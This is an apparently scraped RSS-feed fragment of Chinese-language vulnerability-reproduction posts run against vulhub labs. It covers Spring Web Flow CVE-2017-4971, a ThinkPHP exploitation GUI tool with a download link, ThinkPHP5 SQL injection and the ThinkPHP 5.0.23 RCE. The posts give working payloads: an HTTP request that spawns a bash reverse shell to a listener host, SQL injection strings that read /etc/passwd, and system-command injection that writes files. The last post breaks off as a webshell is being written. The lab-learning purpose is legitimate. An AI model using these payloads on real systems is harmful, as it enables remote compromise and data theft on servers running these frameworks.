&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1.MvcViewFactoryCreator对象的 useSpringBeanBinding参数需要设置为 false（默认值）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2.flow view对象中设置 BinderConfiguration对象为空
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">root@ubuntu:/mnt/vulhub/spring# cd CVE-2017-4971/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@ubuntu:/mnt/vulhub/spring/CVE-2017-4971# docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908153318.png" alt="image.png">&lt;/p>
&lt;h1 id="复现过程">复现过程&lt;/h1>
&lt;p>点击Login，可以看大账号/密码，这里我们随便选择一个进行登录。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">keith/melbourne
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">erwin/leuven
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jeremy/atlanta
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">scott/rochester
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908153359.png" alt="image.png">&lt;/p>
&lt;p>访问id为1的酒店，点击”Book Hotel“预定按钮。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908154241.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908154300.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908154313.png" alt="image.png">&lt;br>
填写一些数据，点击Proceed按钮。&lt;br>
1234567912312312&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908154410.png" alt="image.png">&lt;/p>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908154432.png" alt="image.png">&lt;br>
在点击&lt;code>Confirm&lt;/code>的时候进行抓包，此处存在命令执行，可反弹shell&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">POST /hotels/booking?execution=e2s2 HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: 192.168.197.140:8080
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Encoding: gzip, deflate, br
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Length: 173
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Origin: http://192.168.197.140:8080
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: keep-alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Referer: http://192.168.197.140:8080/hotels/booking?execution=e2s2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cookie: JSESSIONID=4652D2318569E57A87C35C86F4391EDD
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Priority: u=0, i
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_eventId_confirm=&amp;amp;_csrf=9285d191-3a38-4790-a4e0-8862b1bde6c6&amp;amp;_(new+java.lang.ProcessBuilder(&amp;#34;bash&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;bash+-i+&amp;gt;%26+/dev/tcp/192.168.197.129/10086+0&amp;gt;%261&amp;#34;)).start()=vulhub
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>反弹Shell代码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;amp;_(new+java.lang.ProcessBuilder(&amp;#34;bash&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;bash+-i+&amp;gt;%26+/dev/tcp/192.168.197.129/10086+0&amp;gt;%261&amp;#34;)).start()=vulhub
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908155847.png" alt="image.png">&lt;/p>
&lt;h1 id="exp拓展">EXP拓展&lt;/h1>
&lt;p>执行命令&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;amp;amp;_T(java.lang.Runtime).getRuntime().exec(&amp;#34;touch /tmp/success&amp;#34;)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">或者
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;amp;amp;_(new+java.lang.ProcessBuilder(&amp;#34;touch /tmp/success2&amp;#34;)).start()=test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp】漏洞利用工具-thinkphp_gui_tools</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</guid><description>&lt;img src="http://localhost:1313/images/33.webp" alt="Featured image of post 【Thinkphp】漏洞利用工具-thinkphp_gui_tools" />&lt;h1 id="介绍">介绍&lt;/h1>
&lt;p>ThinkPHP漏洞综合利用工具, 图形化界面, 命令执行, 一键getshell, 批量检测, 日志遍历, session包含,宝塔绕过。&lt;/p>
&lt;h1 id="下载地址">下载地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">通过网盘分享的文件：ThinkPHP.jar
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">链接: https://pan.baidu.com/s/1eoU2Lf-ldHhy9W2jx8sRpA 提取码: bn8b
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--来自百度网盘超级会员v4的分享
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="项目地址">项目地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bewhale&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkphp_gui_tools&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。 JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">java -Dfile.encoding=&amp;#34;UTF-8&amp;#34; --module-path &amp;#34;C:\Program Files\Java\javafx-sdk-11.0.2\lib&amp;#34; --add-modules &amp;#34;javafx.controls,javafx.fxml,javafx.web&amp;#34; -jar &amp;#34;xxx.jar&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持大部分&lt;/span>&lt;span class="n">ThinkPHP漏洞检测&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">整合&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="err">多个&lt;/span>&lt;span class="n">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持部分漏洞执行命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持单一漏洞批量检测&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持&lt;/span>&lt;span class="n">TP3和TP5自定义路径日志遍历&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持部分漏洞一键&lt;/span>&lt;span class="n">GetShell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持设置代理和&lt;/span>&lt;span class="n">UA&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904105315.png" alt="image.png">&lt;/p></description></item><item><title>【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</guid><description>&lt;img src="http://localhost:1313/images/32.webp" alt="Featured image of post 【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露" />&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">进入&lt;/span>&lt;span class="n">Vulhub&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cd&lt;/span> &lt;span class="n">vulhub&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">master&lt;/span>\&lt;span class="n">thinkphp&lt;/span>\&lt;span class="ow">in&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">sqlinjection&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">docker&lt;/span> &lt;span class="n">compose&lt;/span> &lt;span class="n">up&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="c1"># 启动后为空白页面，需通过Payload触发漏洞&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>搭建好后是空白页面&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104644.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞利用">漏洞利用&lt;/h1>
&lt;h2 id="报错注入-payload">报错注入 Payload：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user(),0xa),0)]=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>执行后会显示数据库用户信息（如&lt;code>root@localhost&lt;/code>）。&lt;/li>
&lt;/ul>
&lt;h2 id="信息泄露利用">信息泄露利用：&lt;/h2>
&lt;ul>
&lt;li>获取数据库版本：&lt;code>ids[0,updatexml(0,concat(0xa,version()),0)]=1&lt;/code>&lt;/li>
&lt;li>读取文件：&lt;code>ids[0,load_file('/etc/passwd')]=1&lt;/code>（需数据库权限）&lt;br>
利用报错来查看版本信息&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104802.png" alt="image.png">&lt;br>
利用工具进行测试：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104819.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;h1 id="其他">其他&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="err">存在&lt;/span>&lt;span class="n">ThinkPHP&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="n">SQL注入漏洞&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="err">敏感信息泄露&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Payload&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">ids&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="err">存在&lt;/span>&lt;span class="n">ThinkPHP&lt;/span> &lt;span class="mf">5.&lt;/span>&lt;span class="n">x&lt;/span> &lt;span class="err">数据库信息泄露&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Payload&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="n">hostname&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">mysql&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="n">database&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">cat&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/31.webp" alt="Featured image of post 【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞" />&lt;h1 id="漏洞形成原因">漏洞形成原因&lt;/h1>
&lt;h2 id="框架介绍">框架介绍：&lt;/h2>
&lt;p>ThinkPHP是一款运用极广的PHP开发框架。&lt;/p>
&lt;h2 id="漏洞引入">漏洞引入：&lt;/h2>
&lt;p>其5.0.23以前的版本中，获取&lt;strong>method&lt;/strong>的方法中没有正确处理方法名，导致攻击者可以调用&lt;strong>Request&lt;/strong>类任意方法并构造利用链，从而导致远程代码执行漏洞。&lt;/p>
&lt;h1 id="漏洞如何利用">漏洞如何利用&lt;/h1>
&lt;p>访问靶机地址+端口号 进入首页&lt;br>
Burp抓包修改传参方式为Post，传入参数为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=pwd&amp;#34;&lt;/span>&lt;span class="err">，其中&lt;/span>&lt;span class="n">pwd为系统执行命令可进行一系列操作&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>使用&lt;strong>vulhub&lt;/strong>靶场进行搭建&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd thinkphp/5.0.23-rce/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094154.png" alt="image.png">&lt;br>
访问链接：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094245.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>burp抓包&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094438.png" alt="image.png">&lt;br>
修改&lt;br>
传参方式为Post，url后接入&lt;code>/index.php?s=captch&lt;/code>，传入参数为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094649.png" alt="image.png">&lt;br>
&lt;strong>尝试写入phpinfo&lt;/strong>&lt;br>
参数改成&lt;code>echo &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; &amp;gt; info.php&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095528.png" alt="image.png">&lt;br>
&lt;strong>写入一句话&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
